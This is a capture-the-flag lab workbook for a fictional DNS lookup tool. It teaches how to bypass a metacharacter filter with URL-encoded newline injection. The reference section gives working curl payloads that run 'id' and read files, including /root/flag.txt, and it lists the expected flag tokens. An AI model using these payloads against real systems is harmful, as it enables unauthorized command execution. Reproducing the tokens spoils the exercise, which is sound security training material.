# TrueNorth Hosting - Filtered Injection

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `web-2-5-filtered-injection/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **TrueNorth Hosting - Filtered Injection** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **45 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

TrueNorth Hosting provides managed DNS and hosting services for small businesses.
Their customer portal includes a DNS lookup tool that lets users check domain
records directly from the browser.

After a previous security audit flagged command injection risks, the development
team added input filtering to strip dangerous characters: semicolons, pipes, and
ampersands. They believe the tool is now safe.

Sarah Chen (Senior Developer): "We strip all the classic shell metacharacters
before the input hits the command. Semicolons, pipes, ampersands - they're all
gone. There's no way to chain commands now."

Your assessment scope covers the DNS lookup tool and the underlying server.
Two tokens have been placed on the system - find them both and assemble the flag.

## Your Objectives

- Identify a web application that filters user input before passing it to a system command
- Discover which shell metacharacters are blocked and which are not
- Bypass the input filter using newline injection via URL encoding (%0a)
- Execute arbitrary commands to locate hidden files on the server
- Assemble both tokens to capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**Web application responds**

```bash
curl -s http://<target>/ | grep -ci 'truenorth' | awk '{print ($1>=1)?"ok":"none"}'
```

Expected: `ok`

**Normal DNS lookup works**

```bash
curl -s -d 'domain=example.com' http://<target>/lookup | grep -c 'Server'
```

Expected: `1`

**Newline injection executes id**

```bash
curl -s -d 'domain=example.com%0aid' http://<target>/lookup | grep -c 'uid'
```

Expected: `1`

**Extract token 1 via newline injection**

```bash
curl -s -d 'domain=example.com%0acat /opt/truenorth/hidden_config/token1.txt' http://<target>/lookup | grep -oE 'f1lt3r_byp4ss' | head -1
```

Expected: `f1lt3r_byp4ss`

**Extract token 2 via newline injection**

```bash
curl -s -d 'domain=example.com%0acat /root/flag.txt' http://<target>/lookup | grep -oE 'pwn3d' | head -1
```

Expected: `pwn3d`

**Verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

Try the DNS lookup tool normally first with a domain like example.com.
Then try classic injection characters: semicolons (;), pipes (|), and
ampersands (&). Notice they are all stripped. But there are other ways
to separate commands in a shell - what about newline characters?

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

The filter misses URL-encoded newlines. Try submitting a request where
the domain parameter contains %0a followed by a command. For example,
use curl or Burp Suite to send: domain=example.com%0aid
If you see uid output, the injection works. Now explore the filesystem.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

Use newline injection to list directories. Look under /opt/truenorth/
for a hidden configuration directory containing the first token. The
second token is in a common flag location. Assemble them in the format
OCR{token1_token2}.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Validate and encode input at the server, enforce authorization on every object, and monitor unusual request patterns.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
